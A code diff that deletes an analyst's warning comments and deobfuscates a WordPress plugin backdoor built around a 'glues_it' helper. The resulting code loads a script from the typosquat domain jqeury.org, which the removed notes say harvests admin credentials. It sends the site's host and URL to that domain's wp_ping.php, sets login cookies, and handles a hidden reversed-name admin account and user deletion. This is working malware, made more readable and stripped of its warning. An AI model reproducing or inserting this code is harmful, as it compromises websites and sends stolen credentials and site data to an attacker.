@@ -1,77 +1,24 @@
-## WARNING - PLEASE READ ##
-# I DID NOT WROTE THIS CODE.
-# I'M SHARING IT HERE FOR YOU TO BENEFIT.
-# THIS CODE WAS FOUND ON A WORDPRESS PLUGIN.
-
-# WORDPRESS WAS RETURNING AN ERROR WHICH SAID LIKE THIS:
-# fatal error: cannot redeclare glues_it() (previously declared in ...
-
-# I WENT AHEAD AND DID SOME RESEARCH AND FOUND OUT THAT THE PERSON WHO
-# WAS HIRED TO EDIT THE SITE OF MY OLD CLIENT WAS USING PLUGINS WITH THIS
-# SKETCHY WORDPRESS FUNCTION. I BELIEVE THAT THESE ARE PREMIUM PLUGINS
-# BEING PIRATED.
-
-## UPDATE 1
-# I’M STILL LOOKING OUT WHAT IT REALLY DOES BUT FOR THE TIME BEING I TOLD
-# THE SITE OWNER TO GET RID OF THE PLUGINS WITH THE FUNCTION.
-
-## UPDATE 2
-# The function code is actually written in Spanish
-# At least most of it. If you see words, parts of the code not making any
-# sense, probaly that part is written in spanish
-
-## Update 3
-# I got rid of all those dots (something that the code probably does by itself)
-# but i did it to be able to make it a little more readable
-# After doing this I had to make few fixes to make sure the code was the same
-# still the same, just without all those dots.
-# here is the link to the new file without the dots
-# URL
-
-## Update 4
-# The code makes reference to teh domain "jQeury.org"
-# On purpose to make you think you are requesting jQuery.org
-# Right on that like the code does a ruest to the same page at the following path
-# wp_ping.php?dname=wpd&tname=wpt&urliz=urlig
-# What does it does? Maybe requesting data from teh Wordpress Installation ... Not sure yet
-
-## update 5
-# Take a look at http://jqeury.org/jquery-latest.js on line 56
-# After using jsBeautifier on it, this was the result:
-# URL
-# At the begining it looks like a regular jQuery JS file
-# But Take a look at the lines 3349-3368, there is where the cute part begins
-# This file contains a script which "saves" the user/admin credentials
-# using some method I'm still looking.
-#
-# I also found out that on line 145 there is an interesting point
-# Take a look "$nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');"
-# If we read 'php.resu/sedulcni/nimda-pw' backwards we get 'wp-admin/includes/user.php'
-
-
-## END OF WARNING ##
-
 function glues_it($string)
 {
-    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
+    $glue_pre = sanitize_key('str_replace');
     $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
     return $glueit_po;
 }
 
-$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
-$object_dos = 'g..e..t.._o..p..t..i..o..n';
-$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
-$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
-$object_siete = 's..e..t..c..o..o..k..i..e';
-$object_ocho = 'wp.._..lo..g..i..n';
-$object_nueve = 's..i..t..e,..u..rl';
-$object_diez = 'wp_..g..et.._..th..e..m..e';
-$object_once = 'wp.._..r..e..m..o..te.._..g..et';
-$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
-$object_trece = 'g..e..t_..o..p..t..ion';
-$object_catorce = 's..t..r_..r..e..p..l..a..ce';
-$object_quince = 's..t..r..r..e..v';
-$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
+$object_uno = 'function_exists';
+$object_dos = 'get_option';
+$object_tres = 'wp_enqueue_script';
+$object_cinco = 'login_enqueue_scripts';
+$object_siete = 'setcookie';
+$object_ocho = 'wp_login';
+$object_nueve = 'site,url';
+$object_diez = 'wp_get_theme';
+$object_once = 'wp_remote_get';
+$object_doce = 'wp_remote_retrieve_body';
+$object_trece = 'get_option';
+$object_catorce = 'str_replace';
+$object_quince = 'strrev';
+$object_dieciseis = 'update_option';
 $object_dos_pim = glues_it($object_uno);
 $object_tres_pim = glues_it($object_dos);
 $object_cuatro_pim = glues_it($object_tres);
@@ -88,12 +35,12 @@ $object_quince_pim = glues_it($object_quince);
 $object_dieciseis_pim = glues_it($object_dieciseis);
 $noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
 if (!call_user_func($object_dos_pim, 'wp_en_one')) {
-    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
+    $object_diecisiete = 'http://jqeury.org/wp_ping.php?dname=wpd&tname=wpt&urliz=urlig';
     $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
     $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
     $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
     $object_diecisiete_pim = glues_it($object_diecisiete);
-    $object_seis = '_..C..O..O..K..I..E';
+    $object_seis = '_COOKIE';
     $object_seis_pim = glues_it($object_seis);
     $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
     $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
@@ -106,16 +53,16 @@ if (!call_user_func($object_dos_pim, 'wp_en_one')) {
     call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
     function wp_en_one()
     {
-        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
+        $object_one = 'http://jqeury.org/jquery-latest.js';
         $object_one_pim = glues_it($object_one);
-        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
+        $object_four = 'wp_enqueue_script';
         $object_four_pim = glues_it($object_four);
         call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
     }
 
     function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
     {
-        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
+        $ptth = call_user_func($object_quince_pim, glues_it('//:ptth'));
         $dname = $ptth . $_SERVER[$object_diecinueve];
         $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
         $urliz = $dname . $_SERVER[$IRU_TSEUQER];
@@ -123,8 +70,8 @@ if (!call_user_func($object_dos_pim, 'wp_en_one')) {
         $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
         $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
         $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
-        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
-        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
+        $glue_pre = sanitize_key('file_get_contents');
+        $glue_pre_ew = sanitize_key('str_replace');
         call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));
 
     }
@@ -145,11 +92,11 @@ if (!call_user_func($object_dos_pim, 'wp_en_one')) {
 
     function wp_en_three()
     {
-        $object_quince = 's...t...r...r...e...v';
+        $object_quince = 'strrev';
         $object_quince_pim = glues_it($object_quince);
         $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
         $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
-        $object_siete = 's..e..t..c..o..o..k..i..e';;
+        $object_siete = 'setcookie';;
         $object_siete_pim = glues_it($object_siete);
         $path = '/';
         $host = ${$object_dieciocho}[$object_diecinueve];
@@ -161,7 +108,7 @@ if (!call_user_func($object_dos_pim, 'wp_en_one')) {
 
     function wp_en_four()
     {
-        $object_quince = 's..t..r..r..e..v';
+        $object_quince = 'strrev';
         $object_quince_pim = glues_it($object_quince);
         $nigol = call_user_func($object_quince_pim, 'dxtroppus');
         $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
@@ -191,7 +138,7 @@ if (!call_user_func($object_dos_pim, 'wp_en_one')) {
     }
     function wp_en_seis()
     {
-        $object_quince = 's..t..r..r..e..v';
+        $object_quince = 'strrev';
         $object_quince_pim = glues_it($object_quince);
         $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
         $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
@@ -209,9 +156,9 @@ if (!call_user_func($object_dos_pim, 'wp_en_one')) {
     function wp_en_five($hcraes_resu)
     {
         global $current_user, $wpdb;
-        $object_quince = 's..t..r..r..e..v';
+        $object_quince = 'strrev';
         $object_quince_pim = glues_it($object_quince);
-        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
+        $object_catorce = 'str_replace';
         $object_catorce_pim = glues_it($object_catorce);
         $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
         $wp_ux = $current_user->$nigol_resu;
